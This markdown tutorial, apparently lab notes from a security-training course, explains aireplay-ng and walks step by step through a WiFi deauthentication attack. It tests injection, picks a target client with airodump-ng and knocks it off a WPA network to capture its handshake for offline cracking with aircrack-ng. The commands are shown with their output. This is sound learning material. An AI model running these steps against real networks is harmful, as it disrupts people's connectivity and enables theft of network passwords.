---
title: aireplay-ng
description: aireplay-ng
date: '2026-09-21'
tags: []
published: true
slug: aireplay-ng
category: wifi
folder: aircrack-ng-essentials
order: 40
---
# Aireplay-ng

## What is it?

Aireplay-ng creates WiFi traffic. This traffic can later be used with **aircrack-ng** to crack WEP and WPA-PSK passwords.

It can do several things, like:
- Disconnect devices from a network (deauthentication)
- Fake a login to a network
- Replay or inject custom traffic

There's also a related tool called **packetforge-ng** that can build custom traffic from scratch.

---

## See What Aireplay-ng Can Do

Run this to see all its features:

```shellsession
0x0w3@fedora[/htb]$ aireplay-ng

 Attack modes (numbers can still be used):
...
      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen
```

**The main attack types:**

| #   | Attack Name               | What It Does                        |
| --- | ------------------------- | ----------------------------------- |
| 0   | Deauthentication          | Disconnects a device from a network |
| 1   | Fake authentication       | Pretends to log in to a network     |
| 2   | Interactive packet replay | Lets you pick packets to resend     |
| 3   | ARP request replay        | Resends ARP requests                |
| 4   | KoreK chopchop            | Attacks WEP encryption              |
| 5   | Fragmentation             | Builds a valid keystream            |
| 6   | Cafe-latte                | Targets a client for new IVs        |
| 7   | Client fragmentation      | Similar to #5, but client-focused   |
| 8   | WPA Migration Mode        | Targets a specific WPA mode         |
| 9   | Injection test            | Tests if injection works            |

This guide focuses on **Attack 0: Deauthentication** (flag `-0` or `--deauth`). This attack kicks a device off the network — the network is tricked into thinking the disconnect request came from the device itself.

---

## Step 1: Test If Injection Works

Before doing anything, check that your WiFi adapter can actually inject packets. This tells you the link quality (based on how many pings get a response), and if you're using two cards, which one works better for injection.

**First, turn on monitor mode and pick a channel:**

```
sudo airmon-ng start wlan0 1
```

Or, alternatively:

```shellsession
0x0w3@fedora[/htb]$ sudo iw dev wlan0mon set channel 1
```

**Then run the injection test:**

```shellsession
0x0w3@fedora[/htb]$ sudo aireplay-ng --test wlan0mon

12:34:56  Trying broadcast probe requests...
12:34:56  Injection is working!
12:34:56  Found 27 APs
12:34:56  Trying directed probe requests...
12:34:56   00:09:5B:1C:AA:1D - channel: 1 - 'TOMMY'
12:34:56  Ping (min/avg/max): 0.457ms/1.813ms/2.406ms Power: -48.00
12:34:56  30/30: 100%
<SNIP>
```

✅ If you see **"Injection is working!"** — you're good to go, and you're ready to run a deauthentication attack.

---

## Step 2: Find Your Target

Use airodump-ng to see nearby networks and connected devices:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng wlan0mon

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB 
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           HTB 
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4            
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           HTB 
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           jhony
```

**In this example:** There are 3 networks, and 2 clients are connected to the network named **HTB**. Let's target the client with the station ID `00:0F:B5:32:31:31`.

---

## Step 3: Send a Deauth Attack

Once you know your target device and network, run:

```shellsession
0x0w3@fedora[/htb]$ sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon

11:12:33  Waiting for beacon frame (BSSID: 00:14:6C:7A:41:81) on channel 1
11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
11:12:36  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
```

**What each part means:**

| Part | Meaning |
|---|---|
| `-0` | Deauthentication attack |
| `5` | Number of deauth packets to send (use `0` to send forever) |
| `-a 00:14:6C:7A:41:81` | The network's (AP) address |
| `-c 00:0F:B5:32:31:31` | The device to kick off (leave this out to kick off *everyone*) |
| `wlan0mon` | Your WiFi adapter name |

The targeted device will disconnect, then automatically try to reconnect.

---

## Step 4: Watch It Reconnect

Go back to airodump-ng and watch the same network:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng wlan0mon

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB 
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  HTB 
 (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4            
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          HTB 
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          jhony
```

Notice a few things changed:

- The device's **Lost** and **Frames** numbers went way up — a sign it disconnected and reconnected
- A message reading **"WPA handshake: 00:14:6C:7A:41:81"** appears at the top — this means the reconnect moment was captured

💡 **Tip:** If you save your airodump-ng session with `-w`, this handshake gets saved into a `.pcap` file. That file can later be used with aircrack-ng to try cracking the password.

📝 **Note:** In some lab environments, devices reconnect automatically every few seconds — so you might capture a handshake without even needing to send a deauth attack.

